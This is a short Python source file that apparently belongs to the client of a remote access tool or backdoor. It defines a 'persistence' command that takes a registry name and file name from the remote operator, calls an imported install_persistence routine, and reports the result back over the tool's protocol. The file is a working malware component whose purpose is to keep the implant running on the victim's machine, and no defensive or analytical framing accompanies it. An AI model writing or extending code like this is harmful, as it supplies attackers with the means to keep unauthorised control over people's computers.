from client.commands.base import Command
from client.modules.persistence import install_persistence


class PersistenceCommand(Command):
    name = 'persistence'

    def execute(self, ctx, raw: str):
        args = raw[12:].strip().split()
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: persistence <RegName> <FileName>')
            return True
        result = install_persistence(ctx.platform, args[0], args[1])
        ctx.protocol.send(result)
        return True
